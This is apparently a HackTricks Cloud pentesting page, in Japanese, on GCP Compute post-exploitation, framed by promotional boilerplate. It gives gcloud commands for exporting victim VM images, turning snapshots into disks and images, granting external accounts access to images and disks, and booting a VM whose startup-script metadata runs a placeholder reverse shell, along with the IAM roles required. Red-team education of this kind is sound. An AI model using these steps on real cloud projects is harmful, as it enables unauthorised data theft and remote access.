# GCP - Compute Post Exploitation

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## Compute

ComputeとVPC（ネットワーキング）についての詳細は以下をチェックしてください:

{% content-ref url="../../gcp-pentesting/gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-pentesting/gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### イメージをエクスポートしてローカルで検査する

これにより、攻撃者は**既存のイメージ内に含まれるデータにアクセス**したり、**実行中のVMの新しいイメージを作成**して、実行中のVMにアクセスせずにそのデータにアクセスすることができます。

バケットにVMイメージをエクスポートし、それをダウンロードしてローカルでマウントすることができます。コマンドは以下の通りです:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

このアクションを実行する前に、攻撃者はストレージバケットに対する権限と、確実に**cloudbuildに対する権限**が必要です。なぜなら、エクスポートを実行するように要求される**サービス**はcloudbuildだからです。\
さらに、これを機能させるためには、codebuild SAとcompute SAには特権的な権限が必要です。\
cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com` には以下が必要です:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

そして、SA `<project-id>-compute@developer.gserviceaccount.com` には以下が必要です:

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### スナップショットとディスクをローカルでエクスポートして検査する

スナップショットとディスクを直接エクスポートすることはできませんが、**スナップショットをディスクに変換し、ディスクをイメージに変換する**ことは可能であり、**前のセクション**に従って、そのイメージをエクスポートしてローカルで検査することができます

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### イメージを作成するVMを検査する

**イメージに保存されたデータ**や攻撃者がイメージを**作成した** **実行中のVM**内のデータにアクセスする目的で、外部アカウントにイメージへのアクセス権を付与することが可能です：
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
新しいVMをそれから作成します：
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
```markdown
もしあなたがそのイメージに外部アカウントのアクセス権を与えることができなかった場合、被害者のプロジェクトでそのイメージを使用してVMを起動し、以下のパラメータを追加して**メタデータがリバースシェルを実行するように**してイメージにアクセスすることができます:
```
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### スナップショット/ディスクをVMにアタッチして調査する

**ディスクまたはスナップショットに保存されているデータにアクセスする**ために、スナップショットをディスクに変換したり、ディスクをイメージに変換して前述の手順に従うことができます。

または、**外部アカウントにディスクへのアクセス権を付与**することができます（スタートポイントがスナップショットの場合は、スナップショットへのアクセス権を付与するか、それをディスクに作成します）。
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**インスタンスにディスクをアタッチします**:
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
VM内でディスクをマウントする：

1. **VMにSSHで接続**:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```
2. **ディスクを特定する**: VM内で、新しいディスクをディスクデバイスのリストから特定します。通常、`/dev/sdb`、`/dev/sdc`などとして見つけることができます。
3. **ディスクをフォーマットしてマウントする**（新しいディスクまたは生のディスクの場合）:
*   マウントポイントを作成する:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```
*   ディスクをマウントする:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

もし**外部プロジェクトにスナップショットやディスクへのアクセスを許可できない**場合は、**スナップショット/ディスクと同じプロジェクト内のインスタンスでこれらのアクションを実行する**必要があるかもしれません。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSのハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**のGitHubリポジトリ[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
